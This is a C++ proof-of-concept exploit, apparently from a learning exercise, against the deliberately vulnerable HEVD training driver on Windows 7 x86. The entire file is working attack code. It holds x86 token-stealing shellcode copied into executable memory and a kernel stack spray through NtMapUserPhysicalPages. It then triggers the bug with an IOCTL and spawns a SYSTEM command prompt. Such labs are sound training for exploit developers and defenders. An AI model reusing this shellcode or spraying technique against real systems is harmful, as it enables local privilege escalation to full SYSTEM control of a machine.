#include <Windows.h>
#include <stdio.h>
#include <iostream>

#define DEVICE_NAME "\\\\.\\HackSysExtremeVulnerableDriver"
#define IOCTL 0x22202F

typedef NTSTATUS(WINAPI* _NtMapUserPhysicalPages)(
	PINT BaseAddress,
	UINT32 NumberOfPages,
	PBYTE PageFrameNumbers);


void spawnElevatedCmd() {
	std::cout << "[+] Successfully send buffer payload to the driver\n";
	std::cout << "[+] Spawning NT SYSTEM cmd prompt, enjoy!\n";

	STARTUPINFO StartupInfo;
	PROCESS_INFORMATION ProcessInformation;

	ZeroMemory(&StartupInfo, sizeof(StartupInfo));
	ZeroMemory(&ProcessInformation, sizeof(ProcessInformation));

	int aCreated = CreateProcessA("C:\\Windows\\System32\\cmd.exe",
		NULL,
		NULL,
		NULL,
		0,
		CREATE_NEW_CONSOLE,
		NULL,
		NULL,
		&StartupInfo, &ProcessInformation);
	if (aCreated == FALSE) {
		std::cout << "[!] failed to launch process - " << GetLastError() << std::endl;

	}
}

int main() {
	std::cout << "[+] HEVD - Uninitialized Stack Variable Windows 7 x86 exploit POC\n\n";
	HANDLE hDevice = CreateFileA(DEVICE_NAME,
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL,
		NULL);

	if (hDevice == INVALID_HANDLE_VALUE) {
		std::cout << "[!] Failed to establish a device handler - " << GetLastError() << std::endl;
	}
	else {
		std::cout << "[+] Established a handle to the device - " << DEVICE_NAME << std::endl;
	}

	//-------------------------------------------------
	// our shellcode payload
	//-------------------------------------------------

	char shellcodePayload[] = (
		"\x60"
		"\x64\xA1\x24\x01\x00\x00"
		"\x8B\x40\x50"
		"\x89\xC1"
		"\x8B\x98\xF8\x00\x00\x00"
		"\xBA\x04\x00\x00\x00"
		"\x8B\x80\xB8\x00\x00\x00"
		"\x2D\xB8\x00\x00\x00"
		"\x39\x90\xB4\x00\x00\x00"
		"\x75\xED"
		"\x8B\x90\xF8\x00\x00\x00"
		"\x89\x91\xF8\x00\x00\x00"
		"\x61"
		"\x5d"
		"\xc2\x08\x00"
		);

	LPVOID shellcode_address = VirtualAlloc(NULL,
		sizeof(shellcodePayload),
		MEM_RESERVE | MEM_COMMIT,
		PAGE_EXECUTE_READWRITE);

	memcpy(shellcode_address, shellcodePayload, sizeof(shellcodePayload));
	std::cout << "[+] Shellcode allocated at " << std::hex << shellcode_address << std::endl;

	LPVOID shellcodePointerSpray = &shellcode_address;

	//-------------------------------------------------
	// stack spraying
	//-------------------------------------------------
	int BaseAddress = 0;
	char Page_Frame_Numbers[4096] = { 0 };
	for (int i = 0; i < 512; i++) {
		memcpy((Page_Frame_Numbers + (i * 4)), shellcodePointerSpray, 4);
	}
	std::cout << "\t[+] Spraying 512 pages" << std::endl;

	for (int i = 512; i < 1024; i++) {
		memcpy((Page_Frame_Numbers + (i * 4)), shellcodePointerSpray, 4);
	}
	std::cout << "\t[+] Sprayed 1024 pages" << std::endl;
	std::cout << "\t[+] Spraying is now complete" << std::endl;

	std::cout << "[+] Mapping the memory pages with NtMapUserPhysicalPages\n";
	_NtMapUserPhysicalPages NtMapUserPhysicalPages = (_NtMapUserPhysicalPages)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtMapUserPhysicalPages");
	// legit just found someone elses code for this that worked, tried to explain it the best to my ability on my blog post
	NtMapUserPhysicalPages(&BaseAddress, 1024, (PBYTE)&Page_Frame_Numbers);

	//-------------------------------------------------
	// stack spraying
	//-------------------------------------------------

	DWORD sizeReturn = 0x0;
	char userBuffer[] = "\x41\x41\x41\x41";
	std::cout << "[+] Sending final buffer of size: " << sizeof(userBuffer) << std::endl;
	int deviceCom = DeviceIoControl(hDevice,
		IOCTL,
		&userBuffer,
		sizeof(userBuffer),
		NULL,
		0,
		&sizeReturn,
		NULL);
	if (deviceCom) {
		spawnElevatedCmd();
	}
	else {
		std::cout << "[!] Failed to send payload to the device driver\n";
	}
}
